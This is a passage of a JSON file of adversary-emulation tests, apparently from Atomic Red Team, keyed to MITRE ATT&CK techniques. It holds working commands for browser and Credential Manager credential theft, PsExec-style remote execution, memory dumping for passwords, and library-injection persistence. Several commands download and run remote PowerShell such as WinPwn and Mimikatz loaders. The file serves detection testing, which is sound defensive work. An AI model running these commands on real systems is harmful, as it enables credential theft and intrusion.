				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\T1555.003\\bin\\BrowserCollector.exe\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1555.003\\bin\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/SaulBerrenson/BrowserStealer/releases/download/1.0.0.4/BrowserCollector_x64.exe\" -Outfile: \"PathToAtomicsFolder\\T1555.003\\bin\\BrowserCollector.exe\""
			},
			{
				"description": "Login Data file that is a copy of a Firefox Login Data that contains credentials for the tool to \"steal.\" Must exist at the specified path.\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\T1555.003\\src\\key4.db\") {exit 0} else {exit 1}",
				"get_prereq_command": "Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/key4.db?raw=true\" -Outfile: \"PathToAtomicsFolder\\T1555.003\\src\\key4.db\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/logins.json?raw=true\" -Outfile: \"PathToAtomicsFolder\\T1555.003\\src\\logins.json\" "
			}
		],
		"executor": {
			"command": "$profile = (Gci -filter \"*default-release*\" -path $env:Appdata\\Mozilla\\Firefox\\Profiles\\).FullName\nCopy-Item $profile\\key4.db -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\" > $null\nCopy-Item $profile\\logins.json -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\" > $null\nRemove-Item $profile\\key4.db > $null\nRemove-Item $profile\\logins.json > $null\nCopy-Item \"$env:PathToAtomicsFolder\\T1555.003\\src\\key4.db\" -Destination $profile\\ > $null\nCopy-Item \"$env:PathToAtomicsFolder\\T1555.003\\src\\logins.json\" -Destination $profile\\ > $null\ncd \"$env:PathToAtomicsFolder\\T1555.003\\bin\"\n\"\"|.\\BrowserCollector.exe\n",
			"cleanup_command": "$profile = (Gci -filter \"*default-release*\" -path $env:Appdata\\Mozilla\\Firefox\\Profiles\\).FullName\nRemove-Item $profile\\key4.db > $null\nRemove-Item $profile\\logins.json > $null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\" -Destination $profile\\ > $null\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\key4.db\" > $null\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\logins.json\" > $null\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1555.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Dump Chrome Login Data with esentutl",
		"auto_generated_guid": "70422253-8198-4019-b617-6be401b49fce",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_path": {
				"description": "File path for login data dump",
				"type": "string",
				"default": "%temp%\\T1555.003_Login_Data.tmp"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Chrome must be installed\n",
				"prereq_command": "if ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\"\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi\nmsiexec /i $installer /qn\nStart-Process -FilePath \"chrome.exe\"\nStop-Process -Name \"chrome\"\n"
			}
		],
		"executor": {
			"name": "command_prompt",
			"command": "esentutl.exe /y \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\" /d \"#{output_path}\"\n",
			"cleanup_command": "del /f /q #{output_path} > nul 2>&1\n",
			"elevation_required": false
		},
		"attack_technique": "T1555.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Execute a Command as a Service",
		"auto_generated_guid": "2382dee2-a75f-49aa-9378-f52df6ed3fb1",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"service_name": {
				"description": "Name of service to create",
				"type": "string",
				"default": "ARTService"
			},
			"executable_command": {
				"description": "Command to execute as a service",
				"type": "string",
				"default": "%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt"
			}
		},
		"executor": {
			"command": "sc.exe create #{service_name} binPath= \"#{executable_command}\"\nsc.exe start #{service_name}\nsc.exe delete #{service_name}\n",
			"cleanup_command": "del C:\\art-marker.txt >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1569.002",
		"phases": ["execution"]
	},
	{
		"name": "Use PsExec to execute a command on a remote host",
		"auto_generated_guid": "873106b7-cfed-454b-8680-fa9f6400431c",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote_host": {
				"description": "Remote hostname or IP address",
				"type": "string",
				"default": "localhost"
			},
			"user_name": {
				"description": "Username",
				"type": "string",
				"default": "DOMAIN\\Administrator"
			},
			"password": {
				"description": "Password",
				"type": "string",
				"default": "P@ssw0rd1"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "PsExec tool from Sysinternals must exist in the ExternalPayloads directory\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") { exit 0} else { exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force\n"
			}
		],
		"executor": {
			"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\#{remote_host} -u #{user_name} -p #{password} -accepteula \"C:\\Windows\\System32\\calc.exe\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1569.002",
		"phases": ["execution"]
	},
	{
		"name": "psexec.py (Impacket)",
		"auto_generated_guid": "edbcd8c9-3639-4844-afad-455c91e95a35",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"remote_host": {
				"description": "Remote hostname or IP address",
				"type": "string",
				"default": "127.0.0.1"
			},
			"username": {
				"description": "Username",
				"type": "string",
				"default": "Administrator"
			},
			"domain": {
				"description": "Target domain",
				"type": "string",
				"default": ""
			},
			"password": {
				"description": "Password",
				"type": "string",
				"default": "P@ssw0rd1"
			},
			"command": {
				"description": "Command to execute in target computer",
				"type": "string",
				"default": "whoami"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "psexec.py (Impacket)\n",
				"prereq_command": "if [ -x \"$(command -v psexec.py)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "sudo pip3 install impacket\n"
			}
		],
		"executor": {
			"command": "psexec.py '#{domain}/#{username}:#{password}@#{remote_host}' '#{command}'\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1569.002",
		"phases": ["execution"]
	},
	{
		"name": "BlackCat pre-encryption cmds with Lateral Movement",
		"auto_generated_guid": "31eb7828-97d7-4067-9c1e-c6feb85edc4b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"targethost": {
				"description": "Target hostname to attempt psexec connection to for emulation of lateral movement.",
				"type": "string",
				"default": "$ENV:COMPUTERNAME"
			}
		},
		"dependencies": [
			{
				"description": "PsExec must exist on disk at \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\"\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force\n"
			}
		],
		"executor": {
			"command": "cmd.exe /c \"wmic \tcsproduct \tget UUID\" \ncmd.exe /c \"fsutil behavior \tset SymlinkEvaluation R2L:1\" \ncmd.exe /c \"fsutil behavior set \tSymlinkEvaluation R2R:1\"\nreg    add    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f      \ncopy \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" $env:temp\ncmd.exe /c \"$env:temp\\psexec.exe  -accepteula  \\\\#{targethost} cmd.exe  /c echo \"--access-token\"\"\n",
			"cleanup_command": "reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v MaxMpxCt /f\ncmd.exe /c \"fsutil behavior set SymlinkEvaluation R2L:0\" \ncmd.exe /c \"fsutil behavior set SymlinkEvaluation R2R:0\"\nrm $env:temp\\psexec.exe\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1569.002",
		"phases": ["execution"]
	},
	{
		"name": "Use RemCom to execute a command on a remote host",
		"auto_generated_guid": "a5d8cdeb-be90-43a9-8b26-cc618deac1e0",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote_host": {
				"description": "Remote hostname or IP address",
				"type": "string",
				"default": "localhost"
			},
			"user_name": {
				"description": "Username",
				"type": "string",
				"default": "Administrator"
			},
			"password": {
				"description": "Password",
				"type": "string",
				"default": "P@ssw0rd1"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "RemCom tool must exist on disk in the ExternalPayloads folder\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\remcom.exe\") { exit 0} else { exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/kavika13/RemCom/raw/master/bin/Release/RemCom.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\remcom.exe\"\n"
			}
		],
		"executor": {
			"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\remcom.exe\" \\\\#{remote_host} /user:#{user_name} /pwd:#{password} cmd.exe\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1569.002",
		"phases": ["execution"]
	},
	{
		"name": "Snake Malware Service Create",
		"auto_generated_guid": "b8db787e-dbea-493c-96cb-9272296ddc49",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "sc.exe create \"WerFaultSvc\" binPath= \"$env:windir\\WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe\" DisplayName= \"WerFault Service\" start= auto\n",
			"cleanup_command": "sc.exe delete \"WerFaultSvc\"\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1569.002",
		"phases": ["execution"]
	},
	{
		"name": "Modifying ACL of Service Control Manager via SDET",
		"auto_generated_guid": "bf07f520-3909-4ef5-aa22-877a50f2f77b",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "sc.exe sdset scmanager D:(A;;KA;;;WD)\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1569.002",
		"phases": ["execution"]
	},
	{
		"name": "Extract Windows Credential Manager via VBA",
		"auto_generated_guid": "234f9b7c-b53d-4f32-897b-b880a6c9ea7b",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Microsoft Word must be installed\n",
				"prereq_command": "try {\n  New-Object -COMObject \"word.Application\" | Out-Null\n  $process = \"winword\"\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
			}
		],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1555\\src\\T1555-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"\n",
			"cleanup_command": "Remove-Item \"$env:TEMP\\windows-credentials.txt\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1555",
		"phases": ["credential-access"]
	},
	{
		"name": "Dump credentials from Windows Credential Manager With PowerShell [windows Credentials]",
		"auto_generated_guid": "c89becbe-1758-4e7d-a0f4-97d2188a23e3",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force   \n"
		},
		"attack_technique": "T1555",
		"phases": ["credential-access"]
	},
	{
		"name": "Dump credentials from Windows Credential Manager With PowerShell [web Credentials]",
		"auto_generated_guid": "8fd5a296-6772-4766-9991-ff4e92af7240",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force\n"
		},
		"attack_technique": "T1555",
		"phases": ["credential-access"]
	},
	{
		"name": "Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials]",
		"auto_generated_guid": "36753ded-e5c4-4eb5-bc3c-e8fba236878d",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "vaultcmd /listcreds:\"Windows Credentials\" /all\n"
		},
		"attack_technique": "T1555",
		"phases": ["credential-access"]
	},
	{
		"name": "Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]",
		"auto_generated_guid": "bc071188-459f-44d5-901a-f8f2625b2d2e",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "vaultcmd /listcreds:\"Web Credentials\" /all\n"
		},
		"attack_technique": "T1555",
		"phases": ["credential-access"]
	},
	{
		"name": "WinPwn - Loot local Credentials - lazagne",
		"auto_generated_guid": "079ee2e9-6f16-47ca-a635-14efcd994118",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nlazagnemodule -consoleoutput -noninteractive",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1555",
		"phases": ["credential-access"]
	},
	{
		"name": "WinPwn - Loot local Credentials - Wifi Credentials",
		"auto_generated_guid": "afe369c2-b42e-447f-98a3-fb1f4e2b8552",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwificreds -consoleoutput -noninteractive  ",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1555",
		"phases": ["credential-access"]
	},
	{
		"name": "WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords",
		"auto_generated_guid": "db965264-3117-4bad-b7b7-2523b7856b92",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndecryptteamviewer -consoleoutput -noninteractive  ",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1555",
		"phases": ["credential-access"]
	},
	{
		"name": "Install IIS Module using AppCmd.exe",
		"auto_generated_guid": "53adbdfa-8200-490c-871c-d3b1ab3324b2",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"module_name": {
				"description": "The name of the IIS module",
				"type": "string",
				"default": "DefaultDocumentModule_Atomic"
			},
			"dll_path": {
				"description": "The path to the DLL to be loaded",
				"type": "path",
				"default": "%windir%\\system32\\inetsrv\\defdoc.dll"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "IIS must be installed in order to add a module to IIS.\n",
				"prereq_command": "$service = get-service w3svc -ErrorAction SilentlyContinue\nif($service){ Write-Host \"IIS installed on $env:computername\" } else { Write-Host \"IIS is not installed on $env:computername\" } \n",
				"get_prereq_command": "Install IIS to continue.\n"
			}
		],
		"executor": {
			"command": "%windir%\\system32\\inetsrv\\appcmd.exe install module /name:#{module_name} /image:#{dll_path}\n",
			"cleanup_command": "%windir%\\system32\\inetsrv\\appcmd.exe uninstall module #{module_name}\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1505.004",
		"phases": ["persistence"]
	},
	{
		"name": "Install IIS Module using PowerShell Cmdlet New-WebGlobalModule",
		"auto_generated_guid": "cc3381fb-4bd0-405c-a8e4-6cacfac3b06c",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"module_name": {
				"description": "The name of the IIS module",
				"type": "string",
				"default": "DefaultDocumentModule_Atomic"
			},
			"dll_path": {
				"description": "The path to the DLL to be loaded",
				"type": "path",
				"default": "%windir%\\system32\\inetsrv\\defdoc.dll"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "IIS must be installed in order to add a module to IIS.\n",
				"prereq_command": "$service = get-service w3svc -ErrorAction SilentlyContinue\nif($service){ Write-Host \"IIS installed on $env:computername\" } else { Write-Host \"IIS is not installed on $env:computername\" } \n",
				"get_prereq_command": "Install IIS to continue.\n"
			}
		],
		"executor": {
			"command": "New-WebGlobalModule -Name #{module_name} -Image #{dll_path}\n",
			"cleanup_command": "Remove-WebGlobalModule -Name #{module_name}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1505.004",
		"phases": ["persistence"]
	},
	{
		"name": "Dump individual process memory with sh (Local)",
		"auto_generated_guid": "7e91138a-8e74-456d-a007-973d67a0bb80",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"output_file": {
				"description": "Path where captured results will be placed",
				"type": "path",
				"default": "/tmp/T1003.007.bin"
			},
			"script_path": {
				"description": "Path to script generating the target process",
				"type": "path",
				"default": "/tmp/T1003.007.sh"
			},
			"pid_term": {
				"description": "Unique string to use to identify target process",
				"type": "string",
				"default": "T1003.007"
			}
		},
		"dependencies": [
			{
				"description": "Script to launch target process must exist\n",
				"prereq_command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}\n",
				"get_prereq_command": "echo '#!/bin/sh' > #{script_path}\necho \"sh -c 'echo \\\"The password is #{pid_term}\\\" && sleep 30' &\" >> #{script_path}\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nHEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1)\nMEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1))))\nMEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2))))\nMEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"#{output_file}\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\ngrep -i \"PASS\" \"#{output_file}\"\n",
			"cleanup_command": "rm -f \"#{output_file}\"\n"
		},
		"attack_technique": "T1003.007",
		"phases": ["credential-access"]
	},
	{
		"name": "Dump individual process memory with sh on FreeBSD (Local)",
		"auto_generated_guid": "fa37b633-e097-4415-b2b8-c5bf4c86e423",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"output_file": {
				"description": "Path where captured results will be placed",
				"type": "path",
				"default": "/tmp/T1003.007.bin"
			},
			"script_path": {
				"description": "Path to script generating the target process",
				"type": "path",
				"default": "/tmp/T1003.007.sh"
			},
			"pid_term": {
				"description": "Unique string to use to identify target process",
				"type": "string",
				"default": "T1003.007"
			}
		},
		"dependencies": [
			{
				"description": "Script to launch target process must exist\n",
				"prereq_command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}\n",
				"get_prereq_command": "echo '#!/bin/sh' > #{script_path}\necho \"sh -c 'echo \\\"The password is #{pid_term}\\\" && sleep 30' &\" >> #{script_path}\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nMEM_START=$(head -n 5 /proc/\"${PID}\"/map | tail -1 | cut -d' ' -f1)\nMEM_STOP=$(head -n 5 /proc/\"${PID}\"/map | tail -1 | cut -d' ' -f2)\nMEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"#{output_file}\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\nstrings \"#{output_file}\" | grep -i PASS\n",
			"cleanup_command": "rm -f \"#{output_file}\"\n"
		},
		"attack_technique": "T1003.007",
		"phases": ["credential-access"]
	},
	{
		"name": "Dump individual process memory with Python (Local)",
		"auto_generated_guid": "437b2003-a20d-4ed8-834c-4964f24eec63",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"output_file": {
				"description": "Path where captured results will be placed",
				"type": "path",
				"default": "/tmp/T1003.007.bin"
			},
			"script_path": {
				"description": "Path to script generating the target process",
				"type": "path",
				"default": "/tmp/T1003.007.sh"
			},
			"python_script": {
				"description": "Path to script generating the target process",
				"type": "path",
				"default": "PathToAtomicsFolder/T1003.007/src/dump_heap.py"
			},
			"pid_term": {
				"description": "Unique string to use to identify target process",
				"type": "string",
				"default": "T1003.007"
			}
		},
		"dependencies": [
			{
				"description": "Script to launch target process must exist\n",
				"prereq_command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}\n",
				"get_prereq_command": "echo '#!/bin/sh' > #{script_path}\necho \"sh -c 'echo \\\"The password is #{pid_term}\\\" && sleep 30' &\" >> #{script_path}\n"
			},
			{
				"description": "Requires Python\n",
				"prereq_command": "(which python || which python3 || which python2)\n",
				"get_prereq_command": "echo \"Python 2.7+ or 3.4+ must be installed\"\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nPYTHON=$(which python || which python3 || which python2)\n$PYTHON #{python_script} $PID #{output_file}\ngrep -i \"PASS\" \"#{output_file}\"\n",
			"cleanup_command": "rm -f \"#{output_file}\"\n"
		},
		"attack_technique": "T1003.007",
		"phases": ["credential-access"]
	},
	{
		"name": "Capture Passwords with MimiPenguin",
		"auto_generated_guid": "a27418de-bdce-4ebd-b655-38f04842bf0c",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"output_file": {
				"description": "Path where captured results will be placed",
				"type": "path",
				"default": "/tmp/T1003.007Test3.txt"
			},
			"MimiPenguin_Location": {
				"description": "Path of MimiPenguin script",
				"type": "path",
				"default": "/tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "MimiPenguin script must exist on disk at specified location (#{MimiPenguin_Location})\n",
				"prereq_command": "if [ -f \"#{MimiPenguin_Location}\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "wget -O \"/tmp/mimipenguin.tar.gz\" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz\nmkdir /tmp/mimipenguin\ntar -xzvf \"/tmp/mimipenguin.tar.gz\" -C /tmp/mimipenguin\n"
			},
			{
				"description": "Strings must be installed\n",
				"prereq_command": "if [ -x \"$(command -v strings --version)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "sudo apt-get -y install binutils\n"
			},
			{
				"description": "Python2 must be installed\n",
				"prereq_command": "if [ -x \"$(command -v python2 --version)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "sudo apt-get -y install python2       \n"
			},
			{
				"description": "Libc-bin must be installed\n",
				"prereq_command": "if [ -x \"$(command -v ldd --version)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "sudo apt-get -y install libc-bin        \n"
			}
		],
		"executor": {
			"command": "sudo #{MimiPenguin_Location} > #{output_file}\ncat #{output_file}\n",
			"cleanup_command": "rm -f #{output_file} > /dev/null\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1003.007",
		"phases": ["credential-access"]
	},
	{
		"name": "WinPwn - Reflectively load Mimik@tz into memory",
		"auto_generated_guid": "56b9589c-9170-4682-8c3d-33b86ecb5119",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nmimiload -consoleoutput -noninteractive",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1620",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Shared Library Injection via /etc/ld.so.preload",
		"auto_generated_guid": "39cb0e67-dd0d-4b74-a74b-c072db7ae991",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"path_to_shared_library_source": {
				"description": "Path to a shared library source code",
				"type": "path",
				"default": "PathToAtomicsFolder/T1574.006/src/Linux/T1574.006.c"
			},
			"path_to_shared_library": {
				"description": "Path to a shared library object",
				"type": "path",
				"default": "/tmp/T1574006.so"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "The shared library must exist on disk at specified location (#{path_to_shared_library})\n",
				"prereq_command": "if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}\n"
			}
		],
		"executor": {
			"command": "sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'\n",
			"cleanup_command": "sudo sed -i 's##{path_to_shared_library}##' /etc/ld.so.preload\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1574.006",
		"phases": ["defense-evasion", "persistence", "privilege-escalation"]
	},
	{
		"name": "Shared Library Injection via LD_PRELOAD",
		"auto_generated_guid": "bc219ff7-789f-4d51-9142-ecae3397deae",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"path_to_shared_library_source": {
				"description": "Path to a shared library source code",
				"type": "path",
				"default": "PathToAtomicsFolder/T1574.006/src/Linux/T1574.006.c"
			},
			"path_to_shared_library": {
				"description": "Path to a shared library object",
				"type": "path",
				"default": "/tmp/T1574006.so"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "The shared library must exist on disk at specified location (#{path_to_shared_library})\n",
				"prereq_command": "if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}\n"
			}
		],
		"executor": {
			"command": "LD_PRELOAD=#{path_to_shared_library} ls\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1574.006",
		"phases": ["defense-evasion", "persistence", "privilege-escalation"]
	},
	{
		"name": "Dylib Injection via DYLD_INSERT_LIBRARIES",
		"auto_generated_guid": "4d66029d-7355-43fd-93a4-b63ba92ea1be",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"file_to_inject": {
				"description": "Path of executable to be injected. Mostly works on non-apple default apps.",
				"type": "path",
				"default": "/Applications/Firefox.app/Contents/MacOS/firefox"
			},
			"source_file": {
				"description": "Path of c source file",
				"type": "path",
				"default": "PathToAtomicsFolder/T1574.006/src/MacOS/T1574.006.c"
			},
			"dylib_file": {
				"description": "Path of dylib file",
				"type": "path",
				"default": "/tmp/T1574006MOS.dylib"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "Compile the dylib from (#{source_file}). Destination is #{dylib_file}\n",
				"prereq_command": "gcc -dynamiclib #{source_file} -o #{dylib_file}\n",
				"get_prereq_command": "gcc -dynamiclib #{source_file} -o #{dylib_file}\n"
			}
		],
		"executor": {
